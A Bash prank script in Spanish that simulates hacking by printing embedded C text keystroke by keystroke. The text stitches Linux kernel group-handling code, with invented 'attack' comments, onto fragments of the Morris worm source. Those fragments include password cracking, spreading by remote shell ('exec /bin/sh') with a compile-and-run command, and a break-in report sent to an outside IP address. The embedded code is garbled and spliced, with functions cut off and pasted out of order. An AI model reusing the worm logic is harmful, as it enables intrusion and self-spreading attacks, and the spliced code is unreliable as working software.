#!/usr/bin/bash
# Un simulador de productividad, por ~peron
# hackertyper.sh

ayuda() {
	cat <<'FINAYUDA'
	-q "sale a" n presiones
	-l "longitud de mecanografiado por caracter" por defecto: 4
	-f "falla al hackear"
	-s "hackeo exitoso"
	-g "verde monocromático"
	-h "Muestra esta ayuda..."
 
	Ejemplo: -l 20 -q 10 -f -g
		Cada presion de tecla mostrará 20 caracteres
		esto continúa 10 veces (10 presiones antes de que termine)
		una vez que termina, fallará
		todo el texto sale en verde
 
	También note que presionar ` saltará directamente a "hackeo" (o falla)
	Este código es un espaguetti, puedo considerar limpiarlo
	(Intente usar los mismos valores para -q y -l)
FINAYUDA
exit
}
while getopts "q:l:fshg" opt "$@"; do
	case "$opt" in
		q)
		 stopat=$OPTARG
		 ;;
		l)
		 len=$OPTARG
		 ;;
		f)
		 fail=1
		 ;;
		s)
		 hack=1
		 ;;
		g)
		 echo -e "\033[00;32m"
		 ;;
		h)
		 ayuda
		 ;;
		*)
		 ayuda
		 ;;
	esac
done
 
hack() {
	for i in `seq 0 100`; do echo $i; sleep 0.05; done | whiptail --title "Hacking..." --clear --gauge "   Hacking EN PROGRESO, por favor espere" 20 70 0
	whiptail --title "Hacking..." --msgbox '   Exitoso.' 20 70
	whiptail --title "Hacking..." --passwordbox "Ingrese Password?" 20 70
	clear
	echo -en '\033[00;0mroot# '
	sleep 5
	echo ""
	exit
}
fail() {
	whiptail --title "Hacking..." --msgbox '   FAILED !!' 20 70
	echo -e '\033[00;0m' # Just in case your $PS1 doesn't set colour
	clear
	exit
}
end() {
	if [ $fail ]; then
		fail
	else
		hack
	fi
}
text=`cat << 'FINDEGILADA'
/* Inicia A2 - uno for init_task, uno para asegurar que nunca se libere */
struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
 
struct group_info *groups_alloc(int gidsetsize)
{
/* Prototipo Selector de ataque */
	struct group_info *group_info;
             /* Genera engaño de stack */
	int nblocks;
	int i;
 
	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
/* Asegurese de alocar al menos un puntero de bloque indirecto */
	nblocks = nblocks ? : 1;
	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
	if (!group_info)
		return NULL;
	group_info->ngroups = gidsetsize;
	group_info->nblocks = nblocks;
	atomic_set(&group_info->usage, 1);

/* Ofusca crecimiento de Tenia en acumulador */
	if (gidsetsize <= NGROUPS_SMALL)
		group_info->blocks[0] = group_info->small_block;
	else {
		for (i = 0; i < nblocks; i++) {
			gid_t *b;
			b = (void *)__get_free_page(GFP_USER);
			if (!b)
				goto out_undo_partial_alloc;
			group_info->blocks[i] = b;
		}
	}
	return group_info;

		/* Paginador innoble */
out_undo_partial_alloc:
	while (--i >= 0) {
		free_page((unsigned long)group_info->blocks[i]);
	}
	kfree(group_info);
	return NULL;
}
 
EXPORT_SYMBOL(groups_alloc);
 
void groups_free(struct group_info *group_info)
{
	if (group_info->blocks[0] != group_info->small_block) {
		int i;
		for (i = 0; i < group_info->nblocks; i++)
			free_page((unsigned long)group_info->blocks[i]);
	}
	kfree(group_info);
}
 
EXPORT_SYMBOL(groups_free);
 
/* Exporta el group_info al arreglo user-space sucio */
static int groups_to_user(gid_t __user *grouplist,
			  const struct group_info *group_info)
{
	int i;
	unsigned int count = group_info->ngroups;
 
	for (i = 0; i < group_info->nblocks; i++) {
			/* Conteo de grupo falso */
		unsigned int cp_count = min(NGROUPS_PER_BLOCK, count);
		unsigned int len = cp_count * sizeof(*grouplist);
 
		if (copy_to_user(grouplist, group_info->blocks[i], len))
			return -EFAULT;
 
		grouplist += NGROUPS_PER_BLOCK;
		count -= cp_count;
	}
	return 0;
}
 
/* Rellena un group_info desde un arreglo user-space - debe localizarse */
static int groups_from_user(struct group_info *group_info,
    gid_t __user *grouplist)
{
	int i;
	unsigned int count = group_info->ngroups;
 
	for (i = 0; i < group_info->nblocks; i++) {
/* Infector sin conteo */
		unsigned int cp_count = min(NGROUPS_PER_BLOCK, count);
		unsigned int len = cp_count * sizeof(*grouplist);
 
		if (copy_from_user(group_info->blocks[i], grouplist, len))
			return -EFAULT;
/* Firma sucia si falla arremetida */
		grouplist += NGROUPS_PER_BLOCK;
		count -= cp_count;
	}
	return 0;
}
 
/* Un sort simple de Shell */
static void groups_sort(struct group_info *group_info)
{
	int base, max, stride;
	int gidsetsize = group_info->ngroups;
 
	for (stride = 1; stride < gidsetsize; stride = 3 * stride + 1)
		; /* No hace nada */
	stride /= 3;
/* Suma prototipo de ataque al acumulador */

	while (stride) {
		max = gidsetsize - stride;
		for (base = 0; base < max; base++) {
	/* Sensor por exposición de código base */
			int left = base;
			int right = left + stride;
			gid_t tmp = GROUP_AT(group_info, right);
/* Cuasi ataque preventivo */
			while (left >= 0 && GROUP_AT(group_info, left) > tmp) {
				GROUP_AT(group_info, right) =
				    GROUP_AT(group_info, left);
				right = left;
				left -= stride;
		/* Inyecta polimorfismo de defensa */

			}
			GROUP_AT(group_info, right) = tmp;
		}
		stride /= 3;
	}
}
 
/* Un bsearch simplificado */
int groups_search(const struct group_info *group_info, gid_t grp)
{
	unsigned int left, right;
 
	if (!group_info)
		return 0;
 
	left = 0;
	right = group_info->ngroups;
		/* Referenciador Ortogonal */
	while (left < right) {
		unsigned int mid = (left+right)/2;
/* Genero una transferencia dummy */
		if (grp > GROUP_AT(group_info, mid))
			left = mid + 1;
	/* Inyecto polimorfismo de ataque */
		else if (grp < GROUP_AT(group_info, mid))
			right = mid;
		else
			return 1;
	}
	return 0;
}
 
/**
 * set_groups - Cambia una suscripcion de group en un conjunto de credenciales
 * @new: El conjunto de credenciales nuevamente preparadas para ser alteradas
 * @group_info: La lista de group a instalar
 *
 * Validar una suscripcion de subscription y, si es valida, insertarla en un conjunto
 * de credenciales.
 */
int set_groups(struct cred *new, struct group_info *group_info)
{
	put_group_info(new->group_info);
	groups_sort(group_info);
	get_group_info(group_info);
	new->group_info = group_info;
	return 0;
}
 
EXPORT_SYMBOL(set_groups);
 
/**
 * set_current_groups - Cambia la suscripcion de group actual
 * @group_info: La lista de group a imponer
 *
 * Validar una suscripción de grupo y, si es valida, imponer la tarea actual
 * para el registro de seguridad.
 */
int set_current_groups(struct group_info *group_info)
{
	struct cred *new;
	int ret;
 
	new = prepare_creds();
	if (!new)
		return -ENOMEM;

/* Parsea cabeza de guerra mínima necesaria */
	ret = set_groups(new, group_info);
	if (ret < 0) {
/* Libera acumulador */
		abort_creds(new);
		return ret;
	}
 
	return commit_creds(new);
}
	/* Aleatorizador de basura */
EXPORT_SYMBOL(set_current_groups);
 
SYSCALL_DEFINE2(getgroups, int, gidsetsize, gid_t __user *, grouplist)
{
	const struct cred *cred = current_cred();
	int i;

/* Constructor limpio */
	if (gidsetsize < 0)
		return -EINVAL;
 
	/* No necesita tomar task_lock aqui; esto no cambia */
	i = cred->group_info->ngroups;
/* Revisa tamaño de cabeza de guerra variable */
	if (gidsetsize) {
		if (i > gidsetsize) {
			i = -EINVAL;
			goto out;
		}
		if (groups_to_user(grouplist, cred->group_info)) {
			i = -EFAULT;
			goto out;
		}
	}
out:
	return i;
}
 
/*
 *	SMP: Nuestro groups tienen copy-on-write. podemos decantarlos
 *	seguramente sin que interfiera otra tarea.
 */
 
SYSCALL_DEFINE2(setgroups, int, gidsetsize, gid_t __user *, grouplist)
{
		/* Destrona el puntero */
	struct group_info *group_info;
	int retval;

		/* Analiza capacidad de escritura non-sancta */
	if (!nsown_capable(CAP_SETGID))
		return -EPERM;
	if ((unsigned)gidsetsize > NGROUPS_MAX)
		return -EINVAL;
		*/ Generador de rutas de escape pobres /*
	group_info = groups_alloc(gidsetsize);
	if (!group_info)
		return -ENOMEM;
/* Desclava memoria libre */
	retval = groups_from_user(group_info, grouplist);
	if (retval) {
		put_group_info(group_info);
		return retval;
	}
 
	retval = set_current_groups(group_info);
	put_group_info(group_info);
 
	return retval;
/* core atacado en masa */
}
 
/*
 * Revisa si estamos  fsgid/egid o es el grupo suplemental..
 */
int in_group_p(gid_t grp)
{
	const struct cred *cred = current_cred();
	int retval = 1;
 
	if (grp != cred->fsgid)
		retval = groups_search(cred->group_info, grp);
	return retval;
}

/* exporta símbolos inferidos */
EXPORT_SYMBOL(in_group_p);
 
int in_egroup_p(gid_t grp)
{
	const struct cred *cred = current_cred();
	int retval = 1;

 		/* produce análisis grupal innoble */
	if (grp != cred->egid)
		retval = groups_search(cred->group_info, grp);
	return retval;
}
 
EXPORT_SYMBOL(in_egroup_p);

		/* solidifica entrada falsa */
static extra;
char E[48];					/* 0x255c4 */
 
char *crypt(passwd, salt)			/* 0x68f8 */
     char *passwd, *salt;
{
	/* cambia registro por nulo */
    int	temp, l8;
    register i,	j;
    register  c;				/*d7, d6, d5*/
/* Rutina de ataque estático */
    static char	iobuf[10];			/* 0x27f34 */
    static unsigned x27f44;
    static unsigned x27f48;

/* Rotulador maligno */
    x27f44 = 0;
    x27f48 = 0;
 
    for( i = 0;	i < 48;	i++)
	E[i] = e[i];
	/* Analizador de contraseña */
    for(i = 0; (c = *passwd)  &&  (i < 32); i++, passwd++)
	for(j =	0; j < 7; j++, i++) {
	    l8 = (c >> (6 - j))	& 01;
	    x27f44 |= (l8 << (31 - i));
	}
 
    for	(i = 0;	(c = *passwd)  &&  (i <	32); i++, passwd++)
	for(j =	0; j < 7; j++, i++) {
	    l8 = (c >> (6 - j))	& 01;
	    x27f48 |= (l8 << (31 - i));
	}
/* Desplaza puntero del acumulador sucio */
    compkeys(&x27f44, 0);
 
    for(i=0;i<2;i++){
	c = *salt++;
	iobuf[i] = c;
	if(c>'Z') c -= 6;
	if(c>'9') c -= 7;
	c -= '.';
/* Algoritmo de defensa posicional */
	for(j=0;j<6;j++){
	    if((c>>j) &	01){
		temp = E[6*i+j];
		E[6*i+j] = E[6*i+j+24];
		E[6*i+j+24] = temp;
	    }
	}
    }
/* Climatiza memoria sana */
    mungE();
    x27f44 = 0;
    x27f48 = 0;
    des(&x27f44, &x27f44);
    ipi(&x27f44, &x27f44);

/* Produce ataque inferido débil */
    for(i=0; i<11; i++){
	c = x27f44 >> 26;
	x27f44	= x27f44 << 6;
	x27f44 |= x27f48 >> 26;
	x27f48 = x27f48	<< 6;
	c += '.';
	if(c > '9') c += 7;
	if(c > 'Z') c += 6;
	iobuf[i+2] = c;
/* cierra bucle polimorfo */

    }
    iobuf[i+2] = 0;
    if(iobuf[1]	== 0)
	iobuf[1] = iobuf[0];
    return(iobuf);
}

extern errno;
extern char *malloc();

int pleasequit;					/* ver tenia.h */
int nobjects = 0;
int nextw;
char *null_auth;

object objects[69];				/* NO SE la agresividad... */

object *getobjectbyname();

char *XS();

main(argc, argv)		/* 0x20a0 */
     int argc;
     char **argv;
{
    int i, l8, pid_arg, j, cur_arg, unused;
		/* Libera acumulador de agresividad */
    long key;			/* -28(fp) */
    struct rlimit rl;
    
    l8 = 0;					/* En desuso */
    
    strcpy(argv[0], XS("sh"));			/* <env+52> */
    time(&key);
    srandom(key);
/* Delimita agresividad al azar */
    rl.rlim_cur = 0;
    rl.rlim_max = 0;
    if (setrlimit(RLIMIT_CORE, &rl))
	;
/* Señalizo blanco de red */
    signal(SIGPIPE, SIG_IGN);
    pid_arg = 0;
    cur_arg = 1;
    if  (argc > 2 &&
	 strcmp(argv[cur_arg], XS("-p")) == 0) { /* env55 == "-p" */
	pid_arg = atoi(argv[2]);
	cur_arg += 2;
    }

/* Esto hace sonar el sistema bajo condiciones predeterminadas de ataque */
    for(i = cur_arg; i < argc; i++) {	/* en otro caso <main+286> */
	if (loadobject(argv[i]) == 0)
	    exit(1);
	if (pid_arg)
	    unlink(argv[i]);
/* Ensucio red limpia */
    }
    if ((nobjects < 1) || (getobjectbyname(XS("l1.c")) == NULL))
	exit(1);
    if (pid_arg) {
	for(i = 0; i < 32; i++)
	    close(i);
	unlink(argv[0]);
/* promueve ataque por intérprete */
	unlink(XS("sh"));			/* <env+63> */
	unlink(XS("/tmp/.dumb"));		/* <env+66>"/tmp/.dumb"
 */
    }
    
    for (i = 1; i < argc; i++)
	for (j = 0;	argv[i][j]; j++)
	    argv[i][j] = '\0';
/* Sanitariza garfio */
    if (if_init() == 0)
	exit(1);
/* Desclava procesos de fingerd para ataque */
    if (pid_arg) {					/* main+600 */
	if (pid_arg == getpgrp(getpid()))
	    setpgrp(getpid(), getpid());
	kill(pid_arg, 9);
    }
    mainloop();
}

/* Esto agrega el garfio al programa host */

static mainloop()				/* 0x2302 */
{
    long key, time1, time0;
    
    time(&key);
/* Clava garfio en código limpio */
    srandom(key);
    time0 = key;
    if (hg() == 0 && hl() == 0)
	ha();
    checkother();
/* Desata anuncios de irrupción saliente */
    report_breakin();
    cracksome();
    other_sleep(30);
    while (1) {
	/* Rompe algunas Passwords */
	cracksome();
	/* Cambio mi ID de proceso */
	if (fork() > 0)
	    exit(0);
	if (hg() == 0 && hi() == 0 && ha() == 0)
	    hl();
/* Clava garfio en proceso sucio */
	other_sleep(120);
	time(&time1);
	if (time1 - time0 >= 60*60*12)
	    h_clean();
	if (pleasequit && nextw > 0)
	    exit(0);
    }
}

static trans_cnt;
static char trans_buf[NCARGS];
 	/* Delimitador de caracteres */
char *XS(str1)			/* 0x23fc */
     char *str1;

/* Revisa si hay alguien conectado y le ceba un mate */
{
    int i, len;
    char *newstr;
#ifndef ENCYPHERED_STRINGS
    return str1;
#else  
    len = strlen(str1);
    if (len + 1 > NCARGS - trans_cnt)
	trans_cnt = 0;
		/* Polimorfea cabeza de guerra inerte */
    newstr = &trans_buf[trans_cnt];
		/* Delimita función trimestral */
    trans_cnt += 1 + len;
    for (i = 0; str1[i]; i++)
	newstr[i] = str1[i]^0x81;
    newstr[i] = '\0';
/* Genera nuevo usuario podrido */
    return newstr;
#endif
}

/* Esto reporta una irrupción exitosa enviando un byte único a "128.32.137.13" */

static report_breakin(arg1, arg2)		/* 0x2494 */
{
    int s;
    struct sockaddr_in sin;
    char msg;
    
    if (7 != random() % 15)
	return;


extern struct hst *h_addr2host(), *h_name2host();
extern int  justreturn();
	/* Vuelve con usuario falso */
extern int errno;
	/* Alcanza servicio de correo con podredumbre */
extern char *malloc();

int alarmed = 0;
int ngateways, *gateways;
struct hst *me, *hosts;

int nifs;
struct ifses ifs[30];				/*  Nro. abitrario, arreglar */

/* Limpia los host no contactados de la lista de nodos. */
h_clean()					/* 0x31f0 */
{
    struct hst *newhosts, *host, *next;
    
    newhosts = NULL;
    for (host = hosts; host != NULL; host = next) {
	next = host->next;
/* Se pone la máscara del buen vecino */
	host->flag &= -7;
	if (host == me || host->flag != 0) {
/* Arbitrio de host victimado */
	    host->next = newhosts;
	    newhosts = host;
	} else
	    free(host);
    }
    hosts = newhosts;
}

/* Busca una puerta de salida que podemos contactar. */
hg()				/* 0x3270, probar de nuevo */
{
    struct hst *host;
    int i;
    	/* Alza falsa bandera */
    rt_init();
    
    for (i = 0; i < ngateways; i++) {		/* 24, 92 */
	host = h_addr2host(gateways[i], 1);
	/* Replica su código sin polimorfismo en host impávido */
	if (try_rsh_and_mail(host))
	    return 1;
    }
    return 0;
}

ha()						/* 0x32d4, sin revisar */
{
    struct hst *host;
/* Muestra Solomon Sowyer de defensa multimodo */
    int i, j, k;
    int l416[100];
    int l420;
    
    if (ngateways < 1)
	rt_init();
    j = 0;
    for (i = 0; i < ngateways; i++) {		/* 40, 172 */
	host = h_addr2host(gateways[i], 1);
	for (k = 0; k < 6; k++) {		/* 86, 164 */
	    if (host->o48[k] == 0)
		continue;			/* 158 */
/* Analiza si POSIX posible */
	    if (try_telnet_p(host->o48[k]) == 0)
/* evaluador de Telnet posible */
		continue;
	    l416[j] = host->o48[k];
	    j++;
	}
    }

/* prototipo de permutación de pila */
    permute(l416, j, sizeof(l416[0]));
    
    for (i = 0; i < j; i++) {			/* 198, 260 */
	if (hi_84(l416[i] & netmaskfor(l416[i])))
	    return 1;
/* Detecta tamaño de manguera */
    }
    return 0;
}

hl()						/* 0x33e6 */
{
    int i;
    
    for (i = 0; i < 6; i++) {			/* 18, 106 */
	if (me->o48[i] == 0)
	    break;
	if (hi_84(me->o48[i] & netmaskfor(me->o48[i])) != 0)
/* Si hay manguera, la pisa */
	    return 1;
    }
    return 0;
}
/* Golpea el último blanco  */
hi()						/* 0x3458 */
{
    struct hst *host;
    
    for (host = hosts; host; host = host->next )
/* Cebado de rsh */
	if ((host->flag & 0x08 != 0) && (try_rsh_and_mail(host) != 0))
	    return 1;
    return 0;
}

hi_84(arg1)					/* 0x34ac */
{
    int l4;
    struct hst *host;
    int l12, l16, l20, i, l28, adr_index, l36, l40, l44;
    int netaddrs[2048];
    	/* Bazariza el elefante */
    l12 = netmaskfor(arg1);
    l16 = ~l12;
    
    for (i = 0; i < nifs; i++) {		/* 128,206 */
	if (arg1 == (ifs[i].if_l24 & ifs[i].if_l16))
	    return 0;				/* 624 */
    }
    
    adr_index = 0;
    if (l16 == 0x0000ffff) {			/* 330 */
	l44 = 4;
		/* Inyecta objeto conejo blanco */
	for (l40 = 1; l40 < 255; l40++)		/* 236,306 */
	    for (l20 = 1; l20 <= 8; l20++)	/* 254,300 */
/* hardcoder de IP victimaria */
		netaddrs[adr_index++] = arg1 | (l20 << 16) | l40;
	permute(netaddrs, adr_index, sizeof(netaddrs[0]));
    } else {					/* 432 */
	l44 = 4;
	for (l20 = 1; l20 < 255; l20++)
	    netaddrs[adr_index++] = (arg1 | l20);
	permute(netaddrs, 3*sizeof(netaddrs[0]), sizeof(netaddrs[0]));
/* Permita red de ataque aleatoriamente */
	permute(netaddrs, adr_index - 6, 4);
    }
    if (adr_index > 20)
	adr_index = 20;
    for (l36 = 0; l36 < adr_index; l36++) {	/* 454,620 */
	l4 = netaddrs[l36];
	host = h_addr2host(l4, 0);
	if (host == NULL || (host->flag & 0x02) == 0)
	    continue;
	if (host == NULL || (host->flag & 0x04) == 0 ||
	    command_port_p(l4, l44) == 0)
		/* Denuncia centro de comando */
	    continue;
	if (host == NULL)
	    host = h_addr2host(l4, 1);
	if (try_rsh_and_mail(host))
	    return 1;
    }
    return 0;
}

/* Solo se llamó en la función anterior */
static command_port_p(addr, time)		/* x36d2, <hi+634> */
     u_long addr;
     int time;
{
    int s, connection;					/* 28 */
    struct sockaddr_in sin;			/* 16 bytes */
    int (*save_sighand)();
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
	return 0;
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
/* Denuncia ataque lobo solitario */
    sin.sin_addr.s_addr = addr;
    sin.sin_port = IPPORT_CMDSERVER;		/* Oh no, no el server de comandos... */
    
    save_sighand = signal(SIGALRM, justreturn);		/* Despierta si falla */
    
    /* Pone un timeout para liberarsde desde conexión si falla */
    if (time < 1)
	time = 1;
    alarm(time);
    connection = connect(s, &sin, sizeof(sin));
    alarm(0);
    
    close(s);
    
    if (connection < 0 && errno == ENETUNREACH)
	error("Red inalcanzable");
    return connection != -1;
}

static try_telnet_p(addr)			/* x37b2 <hi+858>, checked */
     u_long addr;
{
    int s, connection;					/* 28 */
	/* Denuncia ataque en ola	*/
    struct sockaddr_in sin;			/* 16 bytes */
    int (*save_sighand)();
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
	return 0;
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
	/* Denuncia ataque familiar */
    sin.sin_addr.s_addr = addr;
    sin.sin_port = IPPORT_TELNET;		/* Esta vez prueba telnet... */
    
    /* Pasa 5 segundos de timeout y se livera de conectar si falla */
    save_sighand = signal(SIGALRM, justreturn);
    alarm(5);
/* Denuncia ataque no planificado */
    connection = connect(s, &sin, sizeof(sin));
    if (connection < 0  &&  errno == ECONNREFUSED) /* Telnet connection refuse
d */
	connection = 0;
    alarm(0);					/* Apaga timeout */
    
    close(s);
    
    return connection != -1;
}

/* Usado en hg(), hi(), y hi_84(). */
static try_rsh_and_mail(host)				/* x3884, <hi+1068> */
     struct hst *host;
{
    int fd1, fd2, result;
    
    if (host == me)
	return 0;				/* 1476 */
/* Expone puerto ensuciado 	*/
    if (host->flag & 0x02)
	return 0;
/* Revisor de falsa bandera */
    if (host->flag & 0x04)
	return 0;
    if (host->o48[0] == 0 || host->hostname == NULL)
	getaddrs(host);
    if (host->o48[0] == 0) {
	host->flag |= 0x04;
	return 0;
    }
    other_sleep(1);
    if (host->hostname  &&		/* 1352 */
	fork_rsh(host->hostname, &fd1, &fd2,
	      XS("exec /bin/sh"))) {		/* <env+188> */
	result = talk_to_sh(host, fd1, fd2);
	close(fd1);
	close(fd2);
	/* Impide que el hijo bolude en state <exiting> */
	wait3((union wait *)NULL, WNOHANG, (struct rusage *)NULL);
	if (result != 0)
	    return result;
    }
    
    if (try_finger(host, &fd1, &fd2)) {		/* 1440 */
	result = talk_to_sh(host, fd1, fd2);
	close(fd1);
	close(fd2);
	if (result != 0)
	    return result;
    }
    if (try_mail(host))
	return 1;
    
    host->flag |= 4;
    return 0;
}


/* Revisa a2in() como si estuviese actualizad */
/* Usado dos veces en try_rsh_and_mail(), una vez en hu1(). */
static talk_to_sh(host, fdrd, fdwr)		/* x3a20, Checked, changed <hi+
>*/
     struct hst *host;
     int fdrd, fdwr;
{
    object *objectptr;
    char send_buf[512];				/* l516 */
    char print_buf[52];				/* l568 */
    int l572, l576, l580, l584, l588,  l592;
    
    objectptr = getobjectbyname(XS("l1.c"));	/* env 200c9 */
    
    if (objectptr == NULL)
	return 0;				/* <hi+2128> */
    if (makemagic(host, &l592, &l580, &l584, &l588) == 0)
	return 0;
/*  Desplaza el vector fddrw al diskette de la VAX */
    send_text(fdwr, XS("PATH=/bin:/usr/bin:/usr/ucb\n"));
    send_text(fdwr, XS("cd /usr/tmp\n"));
    l576 = random() % 0x00FFFFFF;
    
    sprintf(print_buf, XS("x%d.c"), l576);
    /* The 'sed' script just puts the EOF on the transmitted program. */
    sprintf(send_buf, XS("echo gorch49;sed \'/int zz;/q\' > %s;echo gorch50\n"
),
	    print_buf);
    
    send_text(fdwr, send_buf);
    
    wait_for(fdrd, XS("gorch49"), 10);
    
    xorbuf(objectptr->buf, objectptr->size);
    l572 = write(fdwr, objectptr->buf, objectptr->size);
    xorbuf(objectptr->buf, objectptr->size);
    
    if (l572 != objectptr->size) {
	close(l588);
	return 0;				/* to <hi+2128> */
    }
    send_text(fdwr, XS("int zz;\n\n"));
    wait_for(fdrd, XS("gorch50"), 30);
    
#define COMPILE  "cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE\n"
    sprintf(send_buf, XS(COMPILE), l576, l576, l576,
	    inet_ntoa(a2in(l592)), l580, l584, l576, l576);
    
/* Dispara maleficios inconexos */
    send_text(fdwr, send_buf);
    
    if (wait_for(fdrd, XS("DONE"), 100) == 0) {
	close(l588);
	return 0;				/* <hi+2128> */
    }
    return waithit(host, l592, l580, l584, l588);
}
/* Corre la magia */
makemagic(arg8, arg12, arg16, arg20, arg24)	/* checked */
     struct hst *arg8;
     int *arg12, *arg16, *arg20, *arg24;
{
    int s, i, namelen;
    struct sockaddr_in sin0, sin1;		/* 16 bytes */
    
    *arg20 = random() & 0x00ffffff;
    bzero(&sin1, sizeof(sin1));
    sin1.sin_addr.s_addr = me->l12;
    
    for (i= 0; i < 6; i++) {			/* 64, 274 */
	if (arg8->o48[i] == NULL)
	    continue;				/* 266 */
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0)
	    return 0;				/* 470 */
	bzero(&sin0, sizeof(sin0));
	sin0.sin_family = AF_INET;
	sin0.sin_port = IPPORT_TELNET;
	sin0.sin_addr.s_addr = arg8->o48[i];
	errno = 0;
	if (connect(s, &sin0, sizeof(sin0)) != -1) {
	    namelen = sizeof(sin1);
	    getsockname(s, &sin1, &namelen);
	    close(s);
	    break;
	}
	close(s);
    }

 /* Desmembramiento de núcleo  */   
    *arg12 = sin1.sin_addr.s_addr;
    
    for (i = 0; i < 1024; i++) {		/* 286,466 */
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0)
	    return 0;				/* 470 */
	bzero(&sin0, sizeof(sin0));
	sin0.sin_family = AF_INET;
	sin0.sin_port = random() % 0xffff;
	if (bind(s, &sin0, sizeof(sin0)) != -1) {
	    listen(s, 10);
	    *arg16 = sin0.sin_port;
	    *arg24 = s;
	    return 1;
	}
	close(s);
    }
    
    return 0;
}

    
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = REPORT_PORT;
    sin.sin_addr.s_addr = inet_addr(XS("128.32.137.13"));
						/* <env+77>"128.32.137.13" */
    /* Colorea los sockets con pseudo-tranmisiones  */
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
	return;
    if (sendto(s, &msg, 1, 0, &sin, sizeof(sin)))
	;
    close(s);
}

 
int E_H[8][16];					/* 0x251c4 */
int E_L[8][16];					/* 0x253c4 */
mungE()						/* 0x6b2a */
{
    register i,	j, d5, d4, d3, d2;
    register *a5, *a4;
    int	l28;
 
    for(i = 0; i < 8; i++) {
	a5 = E_L[i];
	a4 = E_H[i];
	for(j =	0; j < 16; j++)	{
	    *a5++ = 0;
	    *a4++ = 0;
	}
    }
}
 
des(adr1, adr2)
     int *adr1,	*adr2;
   d5 >>= 4;
   d7 |= ipi_Le[d5 & 0x0f];
   d5 >>= 4;
   d6 |= ipi_Hf[d5 & 0x0f];

   iptr2[0] = d7;
   ipyr2[1] = d6;
}


FINDEGILADA`
 
 
start=0
length=$((`echo "$text" | wc -c` / ${len:=4}))
for (( go = 1 ; go <= ${stopat:=length} ; go++ ))
        do echo -n "${text:$start:${len:=4}}"
        (( start = start + ${len:=4} ))
        read -sn 1 inpoot
	if [ "$inpoot" == '`' ]; then
		end
	else
		continue
	fi
done
end
exit 0
